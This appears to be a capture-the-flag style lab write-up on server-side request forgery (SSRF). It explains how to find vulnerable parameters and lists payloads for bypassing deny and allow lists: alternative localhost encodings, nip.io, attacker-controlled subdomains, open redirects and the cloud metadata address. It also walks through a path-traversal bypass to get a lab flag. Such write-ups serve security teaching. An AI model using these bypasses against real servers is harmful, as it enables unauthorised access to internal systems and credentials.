# 📌 Introduction to Server-Side Request Forgery (SSRF)

## ✅ Task 1: What is SSRF?

**Server-Side Request Forgery (SSRF)** is a web security vulnerability allowing attackers to induce a server into making unauthorized requests to internal or external resources.

### 🔍 Types of SSRF:

* **Regular SSRF:**
  The server directly returns data from the requested resource to the attacker.

* **Blind SSRF:**
  No direct response is returned. Attackers confirm exploitation indirectly via logs or external server interactions.

### ⚠️ Potential Impacts:

* Unauthorized internal network access
* Sensitive data extraction (credentials, configuration files)
* Bypass IP-based authentication
* Access restricted administrative endpoints

---

## ✅ Task 2: SSRF Examples

Typical SSRF occurs when web apps fetch external resources without proper input validation.

**Example Exploit:**
An attacker could request internal admin pages:

```
http://127.0.0.1/admin
```

---

## ✅ Task 3: Finding an SSRF

Common places to find potential SSRF:

1. **Full URL Parameter (GET Request):**

```
https://website.thm/form?server=http://server.website.thm/store
```

2. **Hidden HTML Form Fields:**

```html
<form method="post" action="/form">
    <input type="hidden" name="server" value="http://server.website.thm/store">
</form>
```

3. **Hostname Parameters:**

```
https://website.thm/form?server=api
```

4. **Path-Based Parameters:**

```
https://website.thm/form?dst=/forms/contact
```

---

## ✅ Task 4: Defeating Common SSRF Defenses

### 🔒 Bypassing Deny Lists:

Commonly blocked resources like `localhost` or internal IPs (`127.0.0.1`) can be accessed via alternative representations:

* `localhost`
* `127.1`, `127.0.0.1`, `127.*.*.*`
* Decimal form: `2130706433`
* Subdomains resolving to internal IP: `127.0.0.1.nip.io`

Cloud metadata IP (e.g., AWS: `169.254.169.254`) can similarly be bypassed using DNS redirections.

### 🔓 Bypassing Allow Lists:

Allowed domains (e.g., `https://website.thm`) might be bypassed using attacker-controlled subdomains:

* Allowed:

```
https://website.thm
```

* Bypass:

```
https://website.thm.attackers-domain.com
```

### 🔀 Using Open Redirects:

Use open redirect endpoints to redirect requests to internal resources:

* Original allowed URL:

```
https://website.thm/link?url=https://trusted.com
```

* SSRF using open redirect:

```
https://website.thm/link?url=http://internal-resource
```

---

## ✅ Task 5: SSRF Practical Walkthrough

1. **Create Account & Log In:**

* Access:

```
https://LAB_WEB_URL.p.thmlabs.com/customers/new-account-page
```

2. **Inspect Avatar HTML:**

```html
<div class="avatar-image" style="background-image: url('/assets/avatars/1.png')"></div>
<input type="radio" name="avatar" value="assets/avatars/1.png">
```

3. **Select Avatar & Update:**

* Choose an avatar, click "Update Avatar".

4. **Confirm Base64 Avatar Image:**

```html
<div class="avatar-image" style="background-image: url(data:image/png;base64,...)"></div>
```

5. **Attempt SSRF (initial):**

* Right-click avatar → Inspect → Edit input:

```html
<input type="radio" name="avatar" value="private">
```

* Submit form and receive an error:

```
URL cannot start with /private
```

6. **Bypass Using Path Traversal:**

* Edit input again:

```html
<input type="radio" name="avatar" value="x/../private">
```

* Server interprets this as `/private`, bypassing deny list rules.

7. **Retrieve & Decode Flag:**

* After updating, inspect the avatar again.
* The server returns base64 data from the `/private` endpoint.
* Decode this base64 data to obtain the hidden flag.

---

## ✅ Recommendations & Mitigations:

* Employ strict URL validation (whitelisting).
* Prevent user-controlled URLs from accessing internal resources.
* Explicitly block sensitive IP addresses (`127.0.0.1`, `localhost`, `169.254.169.254`).
* Implement robust server-side input validation and filtering.

---

✅ **Happy Hacking! 🎉**
